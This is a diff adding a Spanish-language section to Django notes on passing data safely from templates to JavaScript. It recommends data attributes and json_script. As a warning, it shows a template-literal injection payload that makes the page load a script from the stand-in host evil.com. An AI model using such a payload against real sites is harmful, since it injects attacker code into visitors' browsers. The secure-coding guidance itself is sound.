@@ -5,6 +5,7 @@ tags:
     - django
     - editor
     - database
+    - javascript
 ---
 
 
@@ -1817,3 +1818,159 @@ class RockNRollConfig(AppConfig):
 
 Cuando Django encuentre la etiqueta `rock_n_roll`, se usara como
 configuración la de esta clase.
+
+## How to Safely Pass Data to JavaScript in a Django Template
+
+Hay dos técnicas:
+
+- Usar atributos en marcas Html para datos sencillos
+- Usar `json_script` para datos complejos
+
+La primera idea puede ser la de usar el propio sistema de plantillas de
+django, por ejemplo, haciendo:
+
+```html
+{# DON’T DO THIS #}
+<script>
+    const username = "{{ username }}";
+</script>
+```
+
+Es mejor **evitar siempre esta opción**. Django por defecto escapa los valores
+en las plantillas, así que si `username` fuera, por ejemplo `"Adam <3"`, la
+salida en la plantilla sería:
+
+```html
+<script>
+    const username = "Adam &lt;3";
+</script>
+```
+
+Otro peligro relacionado con esto sería la posibilidad de [inyección de código](https://es.wikipedia.org/wiki/Inyecci%C3%B3n_de_c%C3%B3digo), especialmente si se usan [plantillas
+literal de javascript](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals). En el siguiente ejemplo:
+
+```html
+{# DON’T DO THIS #}
+<script>
+    const greeting = `Hi {{ username }}`;
+</script>
+```
+
+Un visitante malicioso podría incluir una comilla invertida
+para terminar el literal, y añadir su propio código. Por ejemplo, si el valor de
+`username` fuera:
+
+```js
+a`; document.body.appendChild(document.createElement(`script`)).src = `evil.com/js`;`
+```
+
+Entonces la salida final sería:
+
+
+```html
+<script>
+    const greeting = `Hi a`; document.body.appendChild(document.createElement(`script`)).src = `evil.com/js`;``;
+</script>
+```
+
+El sistema de plantillas de Django está pensado para escapar Html, no para
+Javascript, que tiene un sintaxis mucho más compleja.
+
+Descartado esto, veamos pues las dos opciones que tenemos:
+
+### Usar atributos de datos en etiquetas Html
+
+Para datos simple, se pueden usar [atributos de
+datos](https://developer.mozilla.org/en-US/docs/Learn/HTML/Howto/Use_data_attributes), que son atributos genéricos cuyo nombre empiece por `data-`. Por ejemplo:
+
+```html
+<script data-username="{{ username }}">
+    const data = document.currentScript.dataset;
+    const username = data.username;
+</script>
+```
+
+Con `document.currentScript` podemos acceder simple y rápidamente a los
+atributos de datos del _script_ actual. La propiedad `dataset` contiene los
+valores pasados en forma de texto. Esto puede ser usado también con ficheros
+en _scripts_ de javascript independientes:
+
+```html
+{% load static %}
+<script src="{% static 'index.js' %}"
+        defer
+        data-username="{{ username }}"></script>
+```
+
+Que se leería de la misma manera:
+
+```js
+const data = document.currentScript.dataset;
+const username = data.username;
+```
+
+!!! warning "Los nombres de los atributos de datos"
+
+    La propiedad `dataset` convierte de `kebab-case` a `camelCase`. 
+    Por ejemplo el atributo `data-full-name` se accede como `fullName`.
+    Ojo con eso.
+
+!!! warning "Los atributos de datos son siempre texto"
+
+    En dataset solo hay texto. Si necesitamos pasar a otro tipo de datos, como
+    entero o booleano, tenemos que parsearlo nosotros.
+
+No hay límite al numero de atributos de datos que podemos pasarle a un _script_:
+
+```html
+{% load static %}
+<script src="{% static 'index.js' %}"
+        defer
+        data-settings-url="{% url 'settings' %}"
+        data-configuration-url="{% url 'configuration' %}"
+        data-options-url="{% url 'options' %}"
+        data-preferences-url="{% url 'preferences' %}"
+        data-setup-url="{% url 'setup' %}"
+        ></script>
+```
+
+Pero esto puede ser al final complicado si tenemois que pasar muchos datos, o 
+muy complicados. Eso no s lleva a la segunda solución.
+
+### Usar `json_script` para valores complejos
+
+Podemos pasar valores más complicados, como listas o diccionarios, con el
+_tag_ de django `json_script`. Supongamos que tenemos que pasar el valor:
+
+```python
+follower_chart = [
+    {"date": "2022-10-05", "count": 11},
+    {"date": "2022-10-06", "count": 12},
+]
+```
+
+Podemos pasar este valor a través del filtro `json_script`:
+
+```html
+{% load static %}
+
+<script src="{% static 'follower-chart.js' %}" defer></script>
+{{ follower_chart|json_script }}
+```
+
+La salida de la plantilla sería algo como esto:
+
+```js
+<script src="/static/follower-chart.js" defer></script>
+<script type="application/json">[{"date": "2022-10-05", "count": 11}, {"date": "2022-10-06", "count": 12}]</script>
+```
+
+El _script_ puede ahora leer esos datos usando `nextElementSibling` y `document.currentScript`, y parsear esos datos usando `JSON.parse()`:
+
+```
+const data = JSON.parse(
+  document.currentScript.nextElementSibling.textContent
+);
+```
+
+
